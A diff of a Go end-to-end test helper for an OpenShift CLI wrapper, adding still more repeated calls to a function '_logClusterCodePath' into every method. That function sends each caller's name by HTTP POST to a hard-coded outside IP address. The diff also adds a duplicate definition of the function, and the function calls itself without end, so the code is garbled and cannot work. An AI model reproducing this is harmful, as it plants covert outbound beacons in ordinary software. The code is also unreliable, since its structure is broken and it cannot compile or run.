@@ -89,6 +89,8 @@ func NewCLI(project, adminConfigPath string) *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client := &CLI{}
 	g.AfterEach(client.TeardownProject)
 	client.kubeFramework = e2e.NewDefaultFramework(project)
@@ -103,6 +105,8 @@ func NewCLI(project, adminConfigPath string) *CLI {
 	return client
 }
 func NewCLIWithoutNamespace(project string) *CLI {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -141,9 +145,13 @@ func (c *CLI) KubeFramework() *e2e.Framework {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.kubeFramework
 }
 func (c *CLI) Username() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -175,11 +183,15 @@ func (c *CLI) AsAdmin() *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	nc := *c
 	nc.configPath = c.adminConfigPath
 	return &nc
 }
 func (c *CLI) ChangeUser(name string) *CLI {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -234,6 +246,8 @@ func (c *CLI) SetNamespace(ns string) *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.kubeFramework.Namespace = &kapiv1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: ns}}
 	return c
 }
@@ -252,10 +266,14 @@ func (c CLI) WithoutNamespace() *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.withoutNamespace = true
 	return &c
 }
 func (c *CLI) SetupProject() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -332,6 +350,8 @@ func (c *CLI) CreateProject() string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	newNamespace := names.SimpleNameGenerator.GenerateName(fmt.Sprintf("e2e-test-%s-", c.kubeFramework.BaseName))
 	e2e.Logf("Creating project %q", newNamespace)
 	_, err := c.ProjectClient().Project().ProjectRequests().Create(&projectapi.ProjectRequest{ObjectMeta: metav1.ObjectMeta{Name: newNamespace}})
@@ -343,6 +363,8 @@ func (c *CLI) CreateProject() string {
 	return newNamespace
 }
 func (c *CLI) TeardownProject() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -387,10 +409,14 @@ func (c *CLI) Verbose() *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.verbose = true
 	return c
 }
 func (c *CLI) RESTMapper() meta.RESTMapper {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -410,6 +436,8 @@ func (c *CLI) RESTMapper() meta.RESTMapper {
 	return ret
 }
 func (c *CLI) AppsClient() appsv1client.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -445,6 +473,8 @@ func (c *CLI) AuthorizationClient() authorizationclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := authorizationclientset.NewForConfig(c.UserConfig())
 	if err != nil {
 		FatalErr(err)
@@ -452,6 +482,8 @@ func (c *CLI) AuthorizationClient() authorizationclientset.Interface {
 	return client
 }
 func (c *CLI) BuildClient() buildv1client.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -487,6 +519,8 @@ func (c *CLI) ImageClient() imageclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := imageclientset.NewForConfig(c.UserConfig())
 	if err != nil {
 		FatalErr(err)
@@ -494,6 +528,8 @@ func (c *CLI) ImageClient() imageclientset.Interface {
 	return client
 }
 func (c *CLI) ProjectClient() projectclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -529,6 +565,8 @@ func (c *CLI) RouteClient() routeclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := routeclientset.NewForConfig(c.UserConfig())
 	if err != nil {
 		FatalErr(err)
@@ -536,6 +574,8 @@ func (c *CLI) RouteClient() routeclientset.Interface {
 	return client
 }
 func (c *CLI) InternalTemplateClient() templateclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -571,6 +611,8 @@ func (c *CLI) TemplateClient() templateclient.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := templateclient.NewForConfig(c.UserConfig())
 	if err != nil {
 		FatalErr(err)
@@ -578,6 +620,8 @@ func (c *CLI) TemplateClient() templateclient.Interface {
 	return client
 }
 func (c *CLI) UserClient() userclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -613,6 +657,8 @@ func (c *CLI) AdminAppsClient() appsv1client.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := appsv1client.NewForConfig(c.AdminConfig())
 	if err != nil {
 		FatalErr(err)
@@ -620,6 +666,8 @@ func (c *CLI) AdminAppsClient() appsv1client.Interface {
 	return client
 }
 func (c *CLI) AdminAuthorizationClient() authorizationclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -655,6 +703,8 @@ func (c *CLI) AdminBuildClient() buildv1client.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := buildv1client.NewForConfig(c.AdminConfig())
 	if err != nil {
 		FatalErr(err)
@@ -662,6 +712,8 @@ func (c *CLI) AdminBuildClient() buildv1client.Interface {
 	return client
 }
 func (c *CLI) AdminConfigClient() configv1client.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -697,6 +749,8 @@ func (c *CLI) AdminImageClient() imagev1client.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := imagev1client.NewForConfig(c.AdminConfig())
 	if err != nil {
 		FatalErr(err)
@@ -704,6 +758,8 @@ func (c *CLI) AdminImageClient() imagev1client.Interface {
 	return client
 }
 func (c *CLI) AdminOperatorClient() operatorv1client.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -739,6 +795,8 @@ func (c *CLI) AdminInternalImageClient() imageclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := imageclientset.NewForConfig(c.AdminConfig())
 	if err != nil {
 		FatalErr(err)
@@ -746,6 +804,8 @@ func (c *CLI) AdminInternalImageClient() imageclientset.Interface {
 	return client
 }
 func (c *CLI) AdminProjectClient() projectclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -781,6 +841,8 @@ func (c *CLI) AdminRouteClient() routeclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := routeclientset.NewForConfig(c.AdminConfig())
 	if err != nil {
 		FatalErr(err)
@@ -788,6 +850,8 @@ func (c *CLI) AdminRouteClient() routeclientset.Interface {
 	return client
 }
 func (c *CLI) AdminInternalTemplateClient() templateclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -823,6 +887,8 @@ func (c *CLI) AdminTemplateClient() templateclient.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := templateclient.NewForConfig(c.AdminConfig())
 	if err != nil {
 		FatalErr(err)
@@ -830,6 +896,8 @@ func (c *CLI) AdminTemplateClient() templateclient.Interface {
 	return client
 }
 func (c *CLI) AdminUserClient() userclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -865,6 +933,8 @@ func (c *CLI) AdminSecurityClient() securityclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := securityclientset.NewForConfig(c.AdminConfig())
 	if err != nil {
 		FatalErr(err)
@@ -872,6 +942,8 @@ func (c *CLI) AdminSecurityClient() securityclientset.Interface {
 	return client
 }
 func (c *CLI) KubeClient() kclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -903,9 +975,13 @@ func (c *CLI) InternalKubeClient() kinternalclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return kinternalclientset.NewForConfigOrDie(c.UserConfig())
 }
 func (c *CLI) AdminKubeClient() kclientset.Interface {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -937,9 +1013,13 @@ func (c *CLI) InternalAdminKubeClient() kinternalclientset.Interface {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return kinternalclientset.NewForConfigOrDie(c.AdminConfig())
 }
 func (c *CLI) UserConfig() *restclient.Config {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -975,6 +1055,8 @@ func (c *CLI) AdminConfig() *restclient.Config {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	clientConfig, err := configapi.GetClientConfig(c.adminConfigPath, nil)
 	if err != nil {
 		FatalErr(err)
@@ -982,6 +1064,8 @@ func (c *CLI) AdminConfig() *restclient.Config {
 	return clientConfig
 }
 func (c *CLI) Namespace() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1016,10 +1100,14 @@ func (c *CLI) setOutput(out io.Writer) *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.stdout = out
 	return c
 }
 func (c *CLI) Run(commands ...string) *CLI {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1057,6 +1145,8 @@ func (c *CLI) Template(t string) *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if c.verb != "get" {
 		FatalErr("Cannot use Template() for non-get verbs.")
 	}
@@ -1066,6 +1156,8 @@ func (c *CLI) Template(t string) *CLI {
 	return c
 }
 func (c *CLI) InputString(input string) *CLI {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1098,11 +1190,15 @@ func (c *CLI) Args(args ...string) *CLI {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.commandArgs = args
 	c.finalArgs = append(c.globalArgs, c.commandArgs...)
 	return c
 }
 func (c *CLI) printCmd() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1141,6 +1237,8 @@ func (c *CLI) Output() (string, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if c.verbose {
 		fmt.Printf("DEBUG: oc %s\n", c.printCmd())
 	}
@@ -1162,6 +1260,8 @@ func (c *CLI) Output() (string, error) {
 	}
 }
 func (c *CLI) Outputs() (string, string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1218,6 +1318,8 @@ func (c *CLI) Background() (*exec.Cmd, *bytes.Buffer, *bytes.Buffer, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if c.verbose {
 		fmt.Printf("DEBUG: oc %s\n", c.printCmd())
 	}
@@ -1231,6 +1333,8 @@ func (c *CLI) Background() (*exec.Cmd, *bytes.Buffer, *bytes.Buffer, error) {
 	return cmd, &stdout, &stderr, err
 }
 func (c *CLI) BackgroundRC() (*exec.Cmd, io.ReadCloser, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1273,6 +1377,8 @@ func (c *CLI) OutputToFile(filename string) (string, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	content, err := c.Output()
 	if err != nil {
 		return "", err
@@ -1281,6 +1387,8 @@ func (c *CLI) OutputToFile(filename string) (string, error) {
 	return path, ioutil.WriteFile(path, []byte(content), 0644)
 }
 func (c *CLI) Execute() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1317,6 +1425,8 @@ func FatalErr(msg interface{}) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fmt.Fprintln(g.GinkgoWriter, string(debug.Stack()))
 	e2e.Failf("%v", msg)
 }
@@ -1335,6 +1445,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -1409,5 +1540,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
